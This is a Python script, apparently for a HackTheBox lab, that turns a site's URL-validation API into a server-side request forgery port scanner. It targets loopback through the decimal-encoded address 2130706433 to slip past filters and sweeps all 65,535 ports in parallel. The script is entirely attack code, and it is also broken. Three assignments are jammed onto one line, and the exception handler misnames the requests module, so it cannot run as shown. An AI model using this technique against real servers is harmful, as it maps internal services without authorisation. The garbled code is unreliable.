import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = "https://cohort.htb/api/validate"TARGET = "http://2130706433"THREADS = 100

def scan(port):
    data = {
        "url": f"{TARGET}:{port}",
        "format": "csv"    }

    try:
        r = requests.post(URL, json=data, verify=False)
    except request.RequestException as e:
        print("Fatal error:")
        print(e)
        exit(0)
    
    if r.status_code != 200:
        return True
    else:
        if "Could not reach the source: [Errno 111] Connection refused" in r.text:
            return False
        else:
            return True
    return

def main():
    count = 0
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(scan, i): i for i in range(1,65536)}

        for future in as_completed(futures):
            port = futures[future]
            if future.result():
                count += 1
                print(f"Found open port: {port}.")
    
    print()
    print(f"{count} port(s) found in total.")
    return

if __name__ == "__main__":
    main()